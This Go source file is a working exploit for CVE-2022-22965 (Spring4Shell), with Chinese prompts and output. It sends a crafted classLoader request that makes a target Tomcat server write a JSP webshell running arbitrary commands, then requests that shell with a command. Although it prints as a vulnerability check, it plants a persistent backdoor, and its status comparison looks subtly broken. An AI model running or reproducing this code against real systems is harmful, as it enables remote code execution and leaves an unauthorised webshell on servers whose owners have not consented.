package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
)

func CVE_2022_22965() {
	fmt.Println("[*] test starting")
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] 输入url: ")
	url1, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}
	url2 := string(url1)
	name := "/tomcatwar.jsp?pwd=j&cmd=ls"
	payload1 := "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
	url := url2 + payload1

	var client http.Client
	reqg, err := http.NewRequest("GET", url, nil)
	reqg.Header.Add("suffix", "%>//")
	reqg.Header.Add("c1", "Runtime")
	reqg.Header.Add("c2", "<%")
	reqg.Header.Add("DNT", "1")

	resp1, err := client.Do(reqg)
	if err != nil {
		panic(err)
	}

	url3 := url2 + name
	reqg1, err := http.NewRequest("GET", url3, nil)
	reqg1.Header.Add("suffix", "%>//")
	reqg1.Header.Add("c1", "Runtime")
	reqg1.Header.Add("c2", "<%")
	reqg1.Header.Add("DNT", "1")
	resp2, err := client.Do(reqg1)
	// body, err := ioutil.ReadAll(resp2.Body)
	fmt.Println("写入webshell Status:", resp1.Status)
	fmt.Println("访问webshell Status:", resp2.Status)
	// fmt.Println(string(body))
	if resp1.Status == "200 " {
		fmt.Printf("[+] %s CVE-2022-22965存在", url2)
	} else {
		fmt.Printf("[-] %s CVE-2022-22965不存在", url2)
	}
}
